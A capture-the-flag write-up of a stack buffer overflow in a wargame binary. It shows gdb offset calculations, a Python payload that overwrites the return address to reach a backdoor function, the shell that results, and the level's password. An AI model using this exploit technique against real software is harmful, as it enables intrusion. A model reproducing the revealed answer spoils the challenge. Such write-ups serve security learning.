The executable file is in ELF 64-bit format.

The program's exploitation is quite simple: in the set_username() function, the input is sotred in a 128 bytes buffer, which is then copied into `message->username` (of size 40) within a for loop that has a bad stop condition: `for (int i = 0; i <= 40 && buf[i]; i++)`. So we can write stuff at `message->username + 40`, which is actually `message->size`.

`message->size` is used when calling strncpy() in the set_msg() function. By modifying it, we will be able to write much more in `message->msg`, and thus overwrite the return address of the set_msg() function. We can then pass the address of the sercret_backdoor() function present in the program.

1. First of all, we have to overwrite message->size by entering 40 bytes + 1 for the username. In order to have some margin, we can enter \xff (255): `python -c 'print "A" * 40 + "\xff"'`

2. Then we need to find the offset of the handle_msg() return address (since `message->msg` is declared within this function). We know that `message->msg` is located at -0xc0(%rbp). By placing a breakpoint in gdb, we can calculate its effective address: 

```
(gdb) b *0x0000555555554930
Breakpoint 1 at 0x555555554930
(gdb) r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: a
>: Welcome, aaaa
>: Msg @Unix-Dude
>>: a
>: Msg sent!

Breakpoint 1, 0x0000555555554930 in handle_msg ()
(gdb) p $rbp-0xc0
$1 = (void *) 0x7fffffffe500
```

Now that we have the address of `message->msg`, we need to find the address of RIP which holds the handle_msg() return address.

```
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x555555554930 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5e0
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
```

Now we just have to calculate the offset:
```
(gdb) p 0x7fffffffe5c8 - 0x7fffffffe500
$2 = 200
```

So we have to fill in 200 bytes of padding, followed by the secret_backdoor() address (0x000055555555488c).

3. We add a cat - to keep the program open.

4. Once in secret_backdoor(), we can launch a shell with the sh command, or directly display the content of /home/users/end/.pass with the cat command. 

```
level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff"' ; python -c 'print "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"' ; cat -) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
sh
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```